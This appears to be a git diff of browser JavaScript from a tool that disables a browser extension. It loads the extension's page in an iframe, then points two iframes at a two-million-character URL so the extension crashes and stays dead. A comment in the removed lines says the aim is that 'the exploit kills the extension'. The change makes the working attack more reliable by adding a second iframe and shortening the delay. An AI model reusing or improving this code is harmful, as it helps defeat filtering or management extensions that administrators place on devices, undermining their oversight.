@@ -137,18 +137,24 @@
     	    extFrame.src = extURL;
     	    document.body.appendChild(extFrame);
     
-    	    setTimeout(function() {
-        	let killURL = "https://" + "e".repeat(2000000);
-        	extFrame.src = killURL;    
-                setTimeout(function() {
-            	    document.body.removeChild(extFrame);
-            	    document.body.removeChild(overlay);
-		    let persistFrame = document.createElement("iframe"); // Makes a new iframe so the exploit kills the extension instead of restarting it
+	    setTimeout(function() {
+    		let killURL = "https://" + "e".repeat(2000000);
+    		let extFrame1 = document.createElement("iframe");
+    		let extFrame2 = document.createElement("iframe");
+    		extFrame1.src = killURL;
+    		extFrame2.src = killURL;
+    		document.body.appendChild(extFrame1);
+    		document.body.appendChild(extFrame2);
+    		setTimeout(function() {
+        	    document.body.removeChild(extFrame1);
+        	    document.body.removeChild(extFrame2);
+        	    document.body.removeChild(overlay);
+        	    let persistFrame = document.createElement("iframe");
         	    persistFrame.src = extURL;
         	    document.body.appendChild(persistFrame);
-            	    createPopup();
-        	}, 1000);
-    	    }, 250);
+        	    createPopup();
+    		}, 1000);
+	    }, 100);
 	}
 
 	function createPopup() {
